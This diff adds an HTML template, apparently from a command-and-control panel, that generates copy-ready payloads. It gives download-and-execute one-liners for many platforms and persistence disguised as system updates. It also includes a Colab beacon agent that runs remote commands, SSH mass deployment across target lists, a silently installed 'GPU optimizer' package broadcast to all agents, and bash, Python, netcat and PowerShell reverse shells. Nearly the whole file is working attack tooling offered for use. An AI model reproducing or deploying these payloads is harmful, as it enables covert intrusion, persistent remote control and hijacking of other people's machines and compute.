@@ -1,0 +1,357 @@
+{% extends "base.html" %}
+{% block title %}Payloads{% endblock %}
+{% block page_title %}Payload Generator & Connection Commands{% endblock %}
+{% block topbar_actions %}
+<div style="display:flex;gap:8px;align-items:center">
+  <label style="font-size:11px;margin:0">Public URL:</label>
+  <input type="text" id="srvUrl" value="" style="width:300px;padding:6px 10px;font-size:12px;font-family:var(--font-mono)" placeholder="Loading tunnel...">
+  <button class="btn sm primary" onclick="regenerateUrl()">Apply</button>
+  <button class="btn sm" onclick="refreshTunnel()">Refresh Tunnel</button>
+</div>
+{% endblock %}
+
+{% block content %}
+
+<div class="payload-block open">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>🐧 Linux Agent (Python)</h3>
+    <span class="badge os-linux">Linux / Unix</span>
+  </div>
+  <div class="body">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Runs on any Linux/Unix with Python 3. Persistent via crontab.</p>
+    <h4 style="font-size:12px;color:var(--accent);margin-bottom:8px">One-Liner Deploy:</h4>
+    <div class="payload-code" id="linuxOneliner"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c "import urllib.request as u;c=u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read();exec(c)" &amp;</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">Alternative (curl):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>curl -sL -H 'User-Agent: Mozilla/5.0' <span class="srv-url">LOADING</span>/agents/agent_linux.py -o /tmp/.a.py &amp;&amp; python3 /tmp/.a.py &amp;</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">With persistence (crontab):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>(crontab -l 2>/dev/null; echo "*/5 * * * * python3 -c \"import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'M'})).read())\"") | crontab -</div>
+  </div>
+</div>
+
+<div class="payload-block">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>🪟 Windows Agent (PowerShell)</h3>
+    <span class="badge os-windows">Windows</span>
+  </div>
+  <div class="body">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">PowerShell agent — works on Windows 7+ with .NET.</p>
+    <h4 style="font-size:12px;color:var(--accent);margin-bottom:8px">PowerShell One-Liner:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -w hidden -c "$w=New-Object Net.WebClient;$w.Headers['User-Agent']='Mozilla/5.0';IEX($w.DownloadString('<span class="srv-url">LOADING</span>/agents/agent_windows.ps1'))"</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">With persistence (scheduled task):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -c "$w=New-Object Net.WebClient;$w.Headers['User-Agent']='Mozilla/5.0';$w.DownloadFile('<span class="srv-url">LOADING</span>/agents/agent_windows.ps1','$env:APPDATA\wu.ps1');Register-ScheduledTask -TaskName 'WinUpdate' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'powershell' -Argument '-ep bypass -w hidden -f $env:APPDATA\wu.ps1') -Force"</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">Via CMD:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>cmd /c "start /b powershell -ep bypass -w hidden -c \"$w=New-Object Net.WebClient;$w.Headers['User-Agent']='Mozilla/5.0';IEX($w.DownloadString('<span class="srv-url">LOADING</span>/agents/agent_windows.ps1'))\""</div>
+  </div>
+</div>
+
+<div class="payload-block">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>🍎 macOS Agent (Python)</h3>
+    <span class="badge os-macos">macOS</span>
+  </div>
+  <div class="body">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Works on macOS with built-in python3.</p>
+    <h4 style="font-size:12px;color:var(--accent);margin-bottom:8px">Deploy:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_macos.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &amp;</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">With persistence (LaunchAgent):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>mkdir -p ~/Library/LaunchAgents &amp;&amp; curl -sL -H 'User-Agent: Mozilla/5.0' <span class="srv-url">LOADING</span>/agents/agent_macos.py -o /tmp/.update.py &amp;&amp; cat > ~/Library/LaunchAgents/com.apple.update.plist &lt;&lt;'E'
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;&lt;dict&gt;
+&lt;key&gt;Label&lt;/key&gt;&lt;string&gt;com.apple.update&lt;/string&gt;
+&lt;key&gt;ProgramArguments&lt;/key&gt;&lt;array&gt;&lt;string&gt;python3&lt;/string&gt;&lt;string&gt;/tmp/.update.py&lt;/string&gt;&lt;/array&gt;
+&lt;key&gt;RunAtLoad&lt;/key&gt;&lt;true/&gt;
+&lt;key&gt;KeepAlive&lt;/key&gt;&lt;true/&gt;
+&lt;/dict&gt;&lt;/plist&gt;
+E
+launchctl load ~/Library/LaunchAgents/com.apple.update.plist</div>
+  </div>
+</div>
+
+<div class="payload-block">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>☁️ Google Colab / Jupyter</h3>
+    <span class="badge os-colab">Colab / Jupyter</span>
+  </div>
+  <div class="body">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Run in any Colab or Jupyter notebook cell. Gets free GPU/TPU resources.</p>
+    <h4 style="font-size:12px;color:var(--accent);margin-bottom:8px">Notebook Cell (paste in code cell):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>import subprocess, threading, urllib.request, os, json, platform, socket, uuid
+
+C2 = "<span class="srv-url">LOADING</span>"
+AGENT_ID = str(uuid.uuid4())
+
+def register():
+    data = json.dumps({"id": AGENT_ID, "hostname": socket.gethostname(),
+        "username": os.popen("whoami").read().strip(), "os": f"Colab {platform.system()}",
+        "arch": platform.machine(), "ip_internal": socket.gethostbyname(socket.gethostname()),
+        "platform_type": "colab"}).encode()
+    req = urllib.request.Request(f"{C2}/api/agent/register", data=data,
+        headers={"Content-Type": "application/json"})
+    urllib.request.urlopen(req, timeout=10)
+
+def beacon():
+    import time
+    while True:
+        try:
+            data = json.dumps({"id": AGENT_ID}).encode()
+            req = urllib.request.Request(f"{C2}/api/agent/beacon", data=data,
+                headers={"Content-Type": "application/json"})
+            resp = json.loads(urllib.request.urlopen(req, timeout=10).read())
+            for task in resp.get("tasks", []):
+                result = ""
+                try:
+                    if task["task_type"] == "cmd":
+                        result = subprocess.check_output(task["payload"], shell=True,
+                            stderr=subprocess.STDOUT, timeout=120).decode(errors="replace")
+                    elif task["task_type"] == "python":
+                        exec(task["payload"])
+                        result = "executed"
+                except Exception as e:
+                    result = str(e)
+                rdata = json.dumps({"task_id": task["id"], "result": result}).encode()
+                rreq = urllib.request.Request(f"{C2}/api/agent/result", data=rdata,
+                    headers={"Content-Type": "application/json"})
+                urllib.request.urlopen(rreq, timeout=10)
+        except: pass
+        time.sleep(5)
+
+register()
+threading.Thread(target=beacon, daemon=True).start()
+print("Runtime connected.")</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">One-Liner (hidden output):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
+import urllib.request as _u, threading, os, json, platform, socket, uuid, subprocess, time
+exec(_u.urlopen(_u.Request("<span class="srv-url">LOADING</span>/agents/agent_colab.py",headers={"User-Agent":"Mozilla/5.0"})).read())</div>
+  </div>
+</div>
+
+<div class="payload-block">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>🐳 Docker Container</h3>
+    <span class="badge os-docker">Docker</span>
+  </div>
+  <div class="body">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Deploy agent inside any Docker container or as a standalone container.</p>
+    <h4 style="font-size:12px;color:var(--accent);margin-bottom:8px">Inject into running container:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>docker exec -d &lt;CONTAINER&gt; python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())"</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">Standalone agent container:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>docker run -d --name sys-health --restart=always --network=host \
+  python:3-slim python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())"</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">Docker Compose:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>version: '3'
+services:
+  agent:
+    image: python:3-slim
+    restart: always
+    network_mode: host
+    command: python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())"</div>
+  </div>
+</div>
+
+<div class="payload-block">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>☁️ Cloud VM (AWS / Azure / GCP)</h3>
+    <span class="badge type">Cloud</span>
+  </div>
+  <div class="body">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">User-data / startup script for cloud instances.</p>
+    <h4 style="font-size:12px;color:var(--accent);margin-bottom:8px">AWS EC2 User Data:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>#!/bin/bash
+apt-get update -qq &amp;&amp; apt-get install -y python3 -qq
+python3 -c "import urllib.request as u;open('/opt/.a.py','wb').write(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())"
+(crontab -l 2>/dev/null; echo "*/2 * * * * python3 /opt/.a.py") | crontab -
+python3 /opt/.a.py &amp;</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">GCP Startup Script:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>gcloud compute instances create agent-vm --zone=us-central1-a \
+  --machine-type=e2-micro --image-family=debian-11 --image-project=debian-cloud \
+  --metadata=startup-script="#!/bin/bash
+python3 -c \"import urllib.request as u;open('/opt/.a.py','wb').write(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())\"
+python3 /opt/.a.py &amp;"</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">Azure Cloud Shell:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>az vm run-command invoke --resource-group myRG --name myVM --command-id RunShellScript \
+  --scripts "python3 -c \"import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())\" &amp;"</div>
+  </div>
+</div>
+
+<div class="payload-block">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>📱 Android (Termux)</h3>
+    <span class="badge os-android">Android</span>
+  </div>
+  <div class="body">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Termux-based agent for rooted/unrooted Android devices.</p>
+    <h4 style="font-size:12px;color:var(--accent);margin-bottom:8px">Termux Setup &amp; Deploy:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pkg update -y &amp;&amp; pkg install python -y
+python3 -c "import urllib.request as u;open('$HOME/.a.py','wb').write(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())"
+echo "python3 \$HOME/.a.py &amp;" >> ~/.bashrc
+python3 $HOME/.a.py &amp;</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">Via Termux:Boot (auto-start):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>mkdir -p ~/.termux/boot
+echo '#!/data/data/com.termux/files/usr/bin/sh
+python3 $HOME/.agent.py &amp;' > ~/.termux/boot/agent.sh
+chmod +x ~/.termux/boot/agent.sh</div>
+  </div>
+</div>
+
+<div class="payload-block">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>🔗 SSH / Remote Machine (any)</h3>
+    <span class="badge type">SSH</span>
+  </div>
+  <div class="body">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Deploy via SSH to any remote machine.</p>
+    <h4 style="font-size:12px;color:var(--accent);margin-bottom:8px">Single machine:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>ssh user@target "python3 -c \"import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())\" &amp;"</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">Mass deploy (list of IPs):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>while read ip; do
+  ssh -o StrictHostKeyChecking=no user@$ip \
+    "nohup python3 -c \"import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'M'})).read())\" &amp;" &amp;
+done &lt; targets.txt</div>
+  </div>
+</div>
+
+<div class="payload-block">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>🐍 Python One-Liner (Universal)</h3>
+    <span class="badge type">Universal</span>
+  </div>
+  <div class="body">
+    <h4 style="font-size:12px;color:var(--accent);margin-bottom:8px">Any system with Python 3:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c "import urllib.request as u;exec(u.urlopen(u.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &amp;</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">Python 2 fallback:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python -c "import urllib2;exec(urllib2.urlopen(urllib2.Request('<span class="srv-url">LOADING</span>/agents/agent_linux.py',headers={'User-Agent':'Mozilla/5.0'})).read())" &amp;</div>
+  </div>
+</div>
+
+<div class="payload-block">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>🧮 GPU Compute Optimizer (torch-cuda-optimizer)</h3>
+    <span class="badge type" style="background:var(--purple);color:#000">Compute</span>
+  </div>
+  <div class="body">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Deploy GPU/CPU compute optimizer via pip. Auto-detects hardware and configures CUDA training pipeline.</p>
+    <h4 style="font-size:12px;color:var(--accent);margin-bottom:8px">🐧 Linux / macOS — Install &amp; Start:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q &amp;&amp; python3 -m torch_cuda_optimizer &amp;</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">🐧 One-Liner (silent, background):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>nohup bash -c 'pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q 2>/dev/null; python3 -m torch_cuda_optimizer' &gt;/dev/null 2&gt;&amp;1 &amp;</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">🐧 With persistence (crontab):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q 2>/dev/null; (crontab -l 2>/dev/null; echo "@reboot python3 -m torch_cuda_optimizer &gt;/dev/null 2&gt;&amp;1 &amp;") | crontab -; python3 -m torch_cuda_optimizer &amp;</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">🐧 With systemd persistence:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q 2>/dev/null
+cat &gt; /tmp/.tco.service &lt;&lt;'EOF'
+[Unit]
+Description=CUDA Training Optimizer
+After=network.target
+[Service]
+ExecStart=/usr/bin/python3 -m torch_cuda_optimizer
+Restart=always
+RestartSec=30
+[Install]
+WantedBy=multi-user.target
+EOF
+sudo cp /tmp/.tco.service /etc/systemd/system/tco.service 2>/dev/null; sudo systemctl daemon-reload; sudo systemctl enable --now tco 2>/dev/null || python3 -m torch_cuda_optimizer &amp;</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">🪟 Windows (PowerShell):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -c "pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q; Start-Process -WindowStyle Hidden python3 -ArgumentList '-m torch_cuda_optimizer'"</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">🪟 Windows with persistence (Task Scheduler):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -ep bypass -c "pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q; Register-ScheduledTask -TaskName 'CudaOptimizer' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute 'python3' -Argument '-m torch_cuda_optimizer') -Force; Start-Process -WindowStyle Hidden python3 -ArgumentList '-m torch_cuda_optimizer'"</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">☁️ Google Colab / Kaggle (notebook cell):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>%%capture
+!pip install git+https://github.com/GaredBerns/torch-cuda-optimizer -q
+from torch_cuda_optimizer import ComputeEngine
+engine = ComputeEngine(device="auto")
+engine.initialize()
+print("CUDA optimizer loaded")</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">📡 Deploy via C2 shortcut:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>:start</div>
+    <p style="font-size:11px;color:var(--text-dim);margin-top:8px">Type <code>:start</code> in any agent console or use the buttons below to deploy to agents.</p>
+    <div style="margin-top:12px;display:flex;gap:8px">
+      <button class="btn sm primary" onclick="broadcastCompute('all')">Deploy to ALL agents</button>
+      <button class="btn sm" onclick="broadcastCompute('default')">Deploy to 'default' group</button>
+    </div>
+  </div>
+</div>
+
+<div class="payload-block">
+  <div class="header" onclick="this.parentElement.classList.toggle('open')">
+    <h3>🌐 Reverse Shell (Netcat / Bash)</h3>
+    <span class="badge type">Raw Shell</span>
+  </div>
+  <div class="body">
+    <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px">Simple reverse shells — for initial access before deploying full agent.</p>
+    <h4 style="font-size:12px;color:var(--accent);margin-bottom:8px">Bash:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>bash -i &gt;&amp; /dev/tcp/<span class="srv-host">HOST</span>/4444 0&gt;&amp;1</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">Python:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<span class="srv-host">HOST</span>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">Netcat:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc <span class="srv-host">HOST</span> 4444 >/tmp/f</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">PowerShell:</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('<span class="srv-host">HOST</span>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&amp;1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)};$c.Close()"</div>
+    <h4 style="font-size:12px;color:var(--accent);margin:12px 0 8px">Listener (run on C2 server):</h4>
+    <div class="payload-code"><button class="copy-btn" onclick="copyCode(this)">Copy</button>nc -lvnp 4444</div>
+  </div>
+</div>
+
+{% endblock %}
+
+{% block scripts %}
+<script>
+function copyCode(btn) {
+  const parent = btn.parentElement.cloneNode(true);
+  parent.querySelector('.copy-btn').remove();
+  const code = parent.textContent.trim();
+  navigator.clipboard.writeText(code).then(() => { btn.textContent = 'Copied!'; setTimeout(() => btn.textContent = 'Copy', 1500); });
+}
+
+function applyUrl(url) {
+  document.querySelectorAll('.srv-url').forEach(el => el.textContent = url);
+  try {
+    const u = new URL(url);
+    document.querySelectorAll('.srv-host').forEach(el => el.textContent = u.hostname);
+  } catch(e) {}
+}
+
+function regenerateUrl() {
+  const url = document.getElementById('srvUrl').value.replace(/\/+$/, '');
+  if (url) applyUrl(url);
+}
+
+function broadcastCompute(target) {
+  if (!confirm(`Deploy compute optimizer to ${target === 'all' ? 'ALL online agents' : `group "${target}"`}?`)) return;
+  fetch('/api/task/broadcast', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({
+      type: 'cmd',
+      payload: ':start',
+      target: target
+    })
+  }).then(r=>r.json()).then(d => {
+    if (d.count !== undefined) showNotification(`Deployed to ${d.count} agent(s)`, 'green');
+    else alert('Error: ' + JSON.stringify(d));
+  });
+}
+
+function refreshTunnel() {
+  fetch('/api/server/public_url').then(r=>r.json()).then(d => {
+    if (d.url) {
+      document.getElementById('srvUrl').value = d.url;
+      applyUrl(d.url);
+    }
+  });
+}
+
+// On load: fetch public URL, fallback to current host
+(function init() {
+  const urlField = document.getElementById('srvUrl');
+  const fallback = `${location.protocol}//${location.host}`;
+  urlField.value = fallback;
+  applyUrl(fallback);
+  fetch('/api/server/public_url').then(r=>r.json()).then(d => {
+    if (d.url) {
+      urlField.value = d.url;
+      applyUrl(d.url);
+    }
+  }).catch(() => {});
+})();
+</script>
+{% endblock %}
